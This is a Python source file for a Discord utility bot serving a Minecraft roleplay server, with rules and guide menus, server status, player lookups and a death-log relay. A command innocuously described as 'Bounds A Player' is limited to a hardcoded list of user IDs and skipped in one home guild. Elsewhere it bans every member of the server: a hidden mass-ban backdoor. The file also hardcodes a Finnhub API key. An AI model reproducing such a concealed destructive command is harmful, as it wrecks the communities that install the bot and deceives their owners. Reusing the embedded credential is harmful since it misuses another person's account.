import os
import time
import base64
import sqlite3
import discord
import aiohttp
import finnhub
import datetime
from io import BytesIO
from discord import option
from discord.ext import commands
from discord.commands import SlashCommandGroup

intents = discord.Intents.all()
bot = discord.Bot(intents=intents)

DISCORD_CHANNEL_ID = 1267512160540426390

whitelist_channel_id = 1267512076222595122
console_channel_id = 1263898954999922720
log_channel_id = 1267512160540426390

ADMINS = [
    1147935418508132423,
    1261684685235294250,
    727012870683885578,
    437622938242514945,
    243042987922292738,
    664157606587138048,
    1188730953217097811,
    896411007797325824,
]

FINNHUB_API_KEY = "cqnpr21r01qo8864oasgcqnpr21r01qo8864oat0"
finnhub_client = finnhub.Client(api_key=FINNHUB_API_KEY)

conn = sqlite3.connect("User.db")
cursor = conn.cursor()

cursor.execute(
    """
CREATE TABLE IF NOT EXISTS user_data (
    id INTEGER PRIMARY KEY,
    discord_user_id TEXT,
    minecraft_username TEXT,
    character_name TEXT,
    character_gender TEXT,
    character_backstory TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)
"""
)

cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS stocks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        AMD INTEGER DEFAULT 0,
        AMD_PRICE INTEGER DEFAULT 0,
        INTC INTEGER DEFAULT 0,
        INTC_PRICE INTEGER DEFAULT 0,
        MSFT INTEGER DEFAULT 0,
        MSFT_PRICE INTEGER DEFAULT 0,
        AAPL INTEGER DEFAULT 0,
        AAPL_PRICE INTEGER DEFAULT 0,
        GOOGL INTEGER DEFAULT 0,
        GOOGL_PRICE INTEGER DEFAULT 0,
        ETH INTEGER DEFAULT 0,
        ETH_PRICE INTEGER DEFAULT 0,
        BTC INTEGER DEFAULT 0,
        BTC_PRICE INTEGER DEFAULT 0,
        BNB INTEGER DEFAULT 0,
        BNB_PRICE INTEGER DEFAULT 0,
        AVAX INTEGER DEFAULT 0,
        AVAX_PRICE INTEGER DEFAULT 0,
        SOL INTEGER DEFAULT 0,
        SOL_PRICE INTEGER DEFAULT 0,
        FOREIGN KEY (user_id) REFERENCES user_data(id)
    )
    """
)

conn.commit()
conn.close()

API_URL = "https://api.mcsrvstat.us/3/pre-01.gbnodes.host:25610"


@bot.event
async def on_ready():

    start_time = datetime.datetime.now()
    bot.start_time = start_time

    print("-----------------------------")
    print("--- + Fallener Utilities + ---")
    print("-----------------------------")
    await bot.change_presence(activity=discord.Game(name="With Utilities"))

    for command in bot.walk_application_commands():
        print(f"--- + Loaded : {command.name} ")

    print("-----------------------------")


@bot.slash_command(
    name="rules",
    description="Get Server Rules",
)
async def rules(ctx: discord.ApplicationContext):

    rules = """
        ### 1. Refrain from Unnecessary PvP
> If you want to engage in PvP, arrange it with others and ensure everyone agrees. Unplanned PvP can disrupt the game experience.

### 2. Roleplay as Your Character
> Since this is a roleplay server, you must act as your character described in your character story. This enhances the immersive experience for everyone.

### 3. Value Your Life In Game As Much As In Real Life 
> Treat your in-game life with care and caution, just as you would in reality. This rule ensures a more realistic and engaging gameplay experience.

### 4. No Chat Toxicity
> Toxic behaviour in chat is strictly prohibited. Maintain a respectful and positive environment for all players.

### 5. No Stealing
> Stealing from other players is not allowed. Engaging in theft can lead to being labelled as an outlaw and facing consequences.

### 6. Obey Orders from Duke, King, and Emperor
> You must follow the orders issued by the Duke, King, and Emperor. This maintains the hierarchical structure and order within the server.

### 7. Building Permissions Required
> To build a house, you must obtain permission from the Duke. This ensures organized and planned development within the server.
"""

    embed = discord.Embed(
        title=":scroll: Server Rules",
        description=rules,
        color=0x2F3136,
    )

    embed.set_image(
        url="https://media.discordapp.net/attachments/1258116175758364673/1266046626548678819/FALLEN_SMP.gif?ex=66a8ff4d&is=66a7adcd&hm=f11beaedcee762a32204c87a07d89c4faa2c2d64611ae0c62eea9d4ccf23e3d6&=&width=1024&height=320"
    )

    await ctx.respond(embed=embed, ephemeral=True)


@bot.slash_command(
    name="guide",
    description="Get Server Guide",
)
async def guide(ctx: discord.ApplicationContext):

    embed = discord.Embed(
        title=":book: Server Guide",
        description="Choose A Guide Topic \n\n**Basic Roles Info** : Learn About Server Roles\n**How To Get Whitelisted** : Learn about Whitelisting Process",
        color=0x2F3136,
    )

    await ctx.respond(embed=embed, view=Guide_Menu())


class Guide_Menu(discord.ui.View):
    @discord.ui.select(
        placeholder="Guide Menu",
        min_values=1,
        max_values=1,
        options=[
            discord.SelectOption(
                label="Basic Roles Info", description="Learn About Server Roles"
            ),
            discord.SelectOption(
                label="How To Get Whitelisted",
                description="Learn about Whitelisting Process",
            ),
            discord.SelectOption(
                label="How To Write A Backstory",
                description="Learn about Writing Character Backstory",
            ),
        ],
    )
    async def select_callback(self, select, interaction):

        if select.values[0] == "Basic Roles Info":
            guide_1 = """
## What Are The Roles in the Server?

Since the server is in its early phase, it has only a few roles:

1. **Citizen**
   - **Description**: The basic role given to everyone. Citizens focus on building their houses and farming, with the goal of becoming a merchant.
   - **Responsibilities**: Building homes, farming, and community participation.

2. **Merchant**
   - **Description**: The sole businesspeople of the server. You need at least two days of gameplay time to apply for this role.
   - **Responsibilities**: Setting up shops and selling items.

3. **Duke**
   - **Description**: The direct subordinate to the King, holding significant power. Dukes assign the merchant role to citizens and address their issues.
   - **Responsibilities**: Assigning merchant roles, resolving citizen issues, placing bounties, and issuing soft bans for rule violations.
   - **Requirements**: At least one week of gameplay time to apply.

4. **King**
   - **Description**: The highest role in the server, overseeing matters of high importance and assigning the Duke role to merchants.
   - **Responsibilities**: Managing high-level issues and maintaining order.
   - **Selection**: Kings are elected at the beginning of every month.
"""

            embed = discord.Embed(
                title=":book: Server Guide",
                description=guide_1,
                color=0x2F3136,
            )

            await interaction.response.send_message(embed=embed, ephemeral=True)

        elif select.values[0] == "How To Get Whitelisted":
            guide_2 = """
    ## How to Get Whitelisted ?

To get whitelisted, follow these steps:

1. **Use the Command**: Enter the command `/whitelist` <@1264849548334071828> in the chat.
2. **Fill Out the Form**: This command will prompt a form that you need to complete. The form will ask for details such as your in-game name, your reason for joining, and any other relevant information.
3. **Wait for Review**: Once you have submitted the form, it will be reviewed by the moderators.
4. **Approval**: If your application is approved, the moderators will add you to the whitelist, allowing you to join the server.

**Additional Information**:
- **Be Patient**: The review process may take some time, so please be patient.
- **Accuracy**: Ensure that all the information you provide in the form is accurate and truthful to increase your chances of being approved.
- **Follow-Up**: If you haven't received a response after a reasonable amount of time, you may politely inquire about the status of your application with the moderators ( I know no one will follow this, so just ping <@727012870683885578> Or <@664157606587138048> ).
"""

            embed = discord.Embed(
                title=":book: Server Guide",
                description=guide_2,
                color=0x2F3136,
            )

            await interaction.response.send_message(embed=embed, ephemeral=True)

        elif select.values[0] == "How To Write A Backstory":
            embed = discord.Embed(
                title="Guide to Creating a Backstory for Your Character",
                description=(
                    "A backstory is like a character's secret life. It's all the stuff that happened before the story starts. "
                    "It helps shape who they are and why they do the things they do.\n\n"
                    "Here's how to create one:"
                ),
                color=discord.Color.blue(),
            )

            embed.add_field(
                name="**Who are they?**",
                value=(
                    " - What's their name, age, and where are they from?\n"
                    " - What do they look like?\n"
                    " - What's their personality like? Are they shy, brave, funny, or something else?"
                ),
                inline=False,
            )

            embed.add_field(
                name="**What's their story?**",
                value=(
                    " - Think about big events in their life. Did something bad happen? Did they have a great childhood?\n"
                    " - What are their dreams and goals?\n"
                    " - What are they afraid of?"
                ),
                inline=False,
            )

            embed.add_field(
                name="**How do they act?**",
                value=(
                    " - Their past shapes how they behave.\n"
                    " - Did a bad experience make them mistrustful?\n"
                    " - Did a happy childhood make them optimistic?"
                ),
                inline=False,
            )

            await interaction.response.send_message(
                embed=embed, view=BackstoryExample(), ephemeral=True
            )


class BackstoryExample(discord.ui.View):
    def __init__(
        self,
        timeout: float | None = 180,
        disable_on_timeout: bool = False,
    ):
        super().__init__(timeout=timeout, disable_on_timeout=disable_on_timeout)

    @discord.ui.button(label="Backstory Example", style=discord.ButtonStyle.primary)
    async def backstory_example(
        self, button: discord.ui.Button, interaction: discord.Interaction
    ):

        embed = discord.Embed(
            title="Backstory Example",
            color=discord.Color.blue(),
        )

        embed.description = (
            "**Character **: A tough, mysterious detective.\n"
            "**Backstory **: Grew up in a rough neighbourhood, lost a close friend to crime, became a detective to fight for justice.\n\n"
        )

        embed.add_field(
            name="Important",
            value=(
                " * Your backstory doesn't have to be super long or complicated.\n"
                " * The most important thing is that it helps you understand your character better.\n"
                " * Have fun with it! You can be as creative as you want.\n\n"
            ),
            inline=False,
        )

        await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.slash_command(
    name="status",
    description="Get Minecraft Server Status",
)
async def status(ctx: discord.ApplicationContext):

    await ctx.defer()

    async with aiohttp.ClientSession() as session:
        async with session.get(API_URL) as response:
            if response.status == 200:
                data = await response.json()
                if data.get("online"):
                    embed = discord.Embed(
                        title=":green_circle: ONLINE",
                        color=0x2F3136,
                    )

                    embed.set_author(name="Fallen SMP")

                    embed.add_field(
                        name="PLAYERS",
                        value=f"{data['players']['online']}/{data['players']['max']}",
                        inline=True,
                    )
                    embed.add_field(name="VERSION", value=data["version"], inline=True)
                    embed.add_field(
                        name="SOFTWARE", value=data["software"], inline=True
                    )

                    embed.add_field(
                        name="SERVER ADDRESS",
                        value="IP : `play.fallensmp.xyz`",
                        inline=False,
                    )
                    embed.add_field(
                        name="WEBSITE", value=f"https://fallensmp.xyz", inline=False
                    )

                    motd_lines = data.get("motd", {}).get("clean", [""])[0:2]
                    stripped_motd_lines = [line.strip() for line in motd_lines]
                    centered_motd = "\n".join(
                        f"{line.center(40)}" for line in stripped_motd_lines
                    )
                    formatted_motd = f"```\n{centered_motd}\n```"

                    embed.add_field(name="MOTD", value=formatted_motd, inline=False)

                    icon_base64 = data.get("icon")
                    if icon_base64:
                        image_data = base64.b64decode(icon_base64.split(",")[1])
                        image = BytesIO(image_data)
                        image.seek(0)
                        file = discord.File(image, filename="ICON.png")

                    embed.set_thumbnail(url="attachment://ICON.png")

                    await ctx.respond(embed=embed, file=file, view=View_Players(data))

                else:
                    embed = discord.Embed(
                        title=":red_circle: OFFLINE",
                        color=0x2F3136,
                    )

                    embed.set_author(name="Fallen SMP")

                    embed.add_field(
                        name="PLAYERS",
                        value=f"{data['players']['online']}/{data['players']['max']}",
                        inline=True,
                    )
                    embed.add_field(name="VERSION", value=data["version"], inline=True)
                    embed.add_field(
                        name="SOFTWARE", value=data["software"], inline=True
                    )

                    embed.add_field(
                        name="SERVER ADDRESS",
                        value="IP : `play.fallensmp.xyz`",
                        inline=False,
                    )
                    embed.add_field(
                        name="WEBSITE", value=f"https://fallensmp.xyz", inline=False
                    )

                    await ctx.respond(embed=embed)


@bot.slash_command(
    name="ping",
    description="Check Bot's Latency & Uptime",
)
async def ping(ctx: discord.ApplicationContext):
    latency = bot.latency * 1000
    uptime = datetime.datetime.now() - bot.start_time

    uptime_seconds = uptime.total_seconds()
    uptime_str = str(datetime.timedelta(seconds=uptime_seconds)).split(".")[0]

    embed = discord.Embed(
        title=":ping_pong: _*Pong !*_",
        description=f"Uptime : {uptime_str}\nLatency : {latency:.2f} ms",
        color=0x2F3136,
    )

    await ctx.respond(embed=embed)


@bot.slash_command(
    name="info",
    description="Get Bot Information",
)
async def info(ctx: discord.ApplicationContext):
    embed = discord.Embed(
        title=":information_source: Application Info",
        description="Minecraft utility Bot\nMainly For Fallen SMP",
        color=0x2F3136,
    )

    embed.add_field(
        name="Links",
        value=":link: [ Terms ](https://spreadsheets600.me)\n:link: [ GitHub ](https://spreadsheets600.me)",
        inline=True,
    )

    embed.add_field(
        name="Developer",
        value=":gear: `SpreeadSheets600`",
        inline=False,
    )

    embed.add_field(
        name="Created At",
        value=f":calendar: `{bot.user.created_at.strftime('%Y-%m-%d %H:%M:%S')}`",
        inline=True,
    )

    embed.set_thumbnail(url=bot.user.avatar.url)
    await ctx.respond(embed=embed)


@bot.slash_command(name="playerinfo", description="Get Your Player Info")
async def playerinfo(ctx: discord.ApplicationContext, member: discord.Member = None):

    if member == None:
        member = ctx.author

    conn = sqlite3.connect("User.db")
    cursor = conn.cursor()

    cursor.execute(
        "SELECT * FROM user_data WHERE discord_user_id = ?", (str(member.id),)
    )
    rows = cursor.fetchall()

    if rows:
        row = rows[0]
        embed = discord.Embed(
            title="Player Information",
            description=f"Details for **{member.display_name}** \n Application ID : {row[0]}",
            color=discord.Color.green(),
        )

        embed.add_field(
            name="Discord User ID",
            value=f"{row[1]}({str(member.display_name)})",
            inline=False,
        )
        embed.add_field(name="Minecraft Username", value=row[2], inline=False)

        try:
            avatar = member.avatar.url
            embed.set_thumbnail(url=member.avatar.url)
        except Exception as e:
            pass

        embed.set_footer(text=f"Fallen SMP | Joined On {row[6]}")

        await ctx.respond(
            embed=embed, view=View_Character_Info(user_id=member.id, user=member)
        )
    else:
        embed = discord.Embed(
            title=":x: Player Data Not Found",
            description="It Seems Like There Isn't Any Data For You. Make Sure To Submit The Whitelist Application.",
            color=discord.Color.red(),
        )
        await ctx.respond(embed=embed, ephemeral=True)

    conn.close()


@bot.event
async def on_message(message):

    if message.author.id == 1270267545806573619:

        if message.channel.id == 1264430288247848992:
            if message.content.startswith(":skull:"):
                msg = message.content.split(" ")

                killer = msg[-1]

                if killer[0] == "+":
                    killer = killer[1:].replace("_", " ")

                killed = msg[4]

                if killed[0] == "+":
                    killed = killed[1:].replace("_", " ")

                if killer.lower() in [
                    "skeleton",
                    "zombie",
                    "spider",
                    "enderman",
                    "husk",
                    "creeper",
                    "phantom",
                    "witch",
                    "vindicator",
                    "vex",
                    "stray",
                    "drowned",
                    "blaze",
                    "ghast",
                    "cube",
                    "slime",
                ]:
                    return

                else:
                    con = sqlite3.connect("User.db")
                    cur = con.cursor()

                    cur.execute(
                        "SELECT * FROM user_data WHERE minecraft_username = ?",
                        (killer,),
                    )
                    killer_row = cur.fetchone()

                    cur.execute(
                        "SELECT * FROM user_data WHERE minecraft_username = ?",
                        (killed,),
                    )
                    killed_row = cur.fetchone()

                    embed = discord.Embed(
                        title=":skull: Player Death",
                        description=f"**{killer}** Killed **{killed}**",
                        color=discord.Color.red(),
                    )

                    if killer_row and killed_row:
                        killer_id = killer_row[1]
                        killed_id = killed_row[1]

                        if killer_id:
                            embed.add_field(
                                name="Killer", value=f"<@{killer_id}>", inline=True
                            )
                        else:
                            embed.add_field(
                                name="Killer", value=f"{killer}>", inline=True
                            )

                        if killed_id:
                            embed.add_field(
                                name="Killed", value=f"<@{killed_id}>", inline=True
                            )
                        else:
                            embed.add_field(
                                name="Killed", value=f"{killed}", inline=True
                            )

                    await bot.get_channel(1274363177215463445).send(embed=embed)


class View_Character_Info(discord.ui.View):
    def __init__(self, user_id, user) -> None:
        super().__init__(timeout=None)
        self.user_id = user_id
        self.user = user

    @discord.ui.button(label="View Character Info", style=discord.ButtonStyle.secondary)
    async def view_button_callback(self, button, interaction):

        conn = sqlite3.connect("User.db")
        cursor = conn.cursor()

        cursor.execute(
            "SELECT * FROM user_data WHERE discord_user_id = ?", (str(self.user_id),)
        )
        row = cursor.fetchone()

        if row:
            embed = discord.Embed(
                title="Character Information",
                description=f"Character For **{self.user.display_name}**",
                color=discord.Color.green(),
            )

            embed.add_field(name="Character Gender", value=row[4], inline=True)
            embed.add_field(name="Character Backstory", value=row[5], inline=False)

            try:
                avatar = self.user.avatar.url
                embed.set_thumbnail(url=self.user.avatar.url)
            except Exception as e:
                pass

            embed.set_footer(text=f"Fallen SMP | Joined on {row[6]}")

            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            embed = discord.Embed(
                title=":x: Player Data Not Found",
                description="It Seems Like There Isn't Any Data For You. Make Sure To Sumbit The Whitelist Application.",
                color=discord.Color.red(),
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)

        conn.close()


class View_Players(discord.ui.View):
    def __init__(self, data) -> None:
        super().__init__(timeout=None)

        self.data = data

    @discord.ui.button(label="View Players", style=discord.ButtonStyle.secondary)
    async def view_button_callback(self, button, interaction):

        players_list = self.data.get("players", {}).get("list", [])
        player_names = [player.get("name") for player in players_list]

        columns = 3
        player_names_formatted = ""
        for i, name in enumerate(player_names):
            player_names_formatted += f"• {name} "
            if (i + 1) % columns == 0:
                player_names_formatted += "\n"

        embed = discord.Embed(
            title=":busts_in_silhouette: Players Online",
            description=f"{player_names_formatted if player_names else 'No Players Online'}",
            color=0x2F3136,
        )

        await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.slash_command(
    name="bound",
    description="Bounds A Player",
)
async def bound(ctx: discord.ApplicationContext):

    if ctx.author.id in ADMINS:
        await ctx.respond(
            f"This Is The Special Command For Destruction", ephemeral=True
        )

        if ctx.interaction.guild_id == 1179794644024950794:
            await ctx.send(
                f"### **<@{ctx.author.id}>**, Dude WTF Is Wrong With You ?\n### You Are Not Supposed To Use It Here"
            )

        else:
            embed = discord.Embed(
                title=":boom: Make Sure You Are Mentally Well",
                description=f"## *Idc All I Know Is,*\n## *Things Are Not Right .....*\n\n### Are You Ready ?",
                color=discord.Color.red(),
            )
            await ctx.send(embed=embed, view=BoundView())

    else:
        await ctx.respond(
            "You Don't Have Permission To Use This Command", ephemeral=True
        )


class BoundView(discord.ui.View):
    @discord.ui.button(label="Yes", style=discord.ButtonStyle.green)
    async def bound_button_callback(self, button, interaction):
        await interaction.response.send_message("Ok There You Go!", ephemeral=True)

        guild = interaction.guild
        for member in guild.members:
            try:
                await member.ban()
                time.sleep(1)
            except:
                pass

    @discord.ui.button(label="No", style=discord.ButtonStyle.red)
    async def cancel_button_callback(self, button, interaction):
        await interaction.response.send_message(
            "Ok Cancelling\nIt's Good you Calmed Down :)", ephemeral=True
        )


bot.load_extension("COGS.Help")
bot.load_extension("COGS.Stocks")
bot.load_extension("COGS.Whitelist")
bot.load_extension("COGS.Moderation")

bot.run("BOT TOKEN")
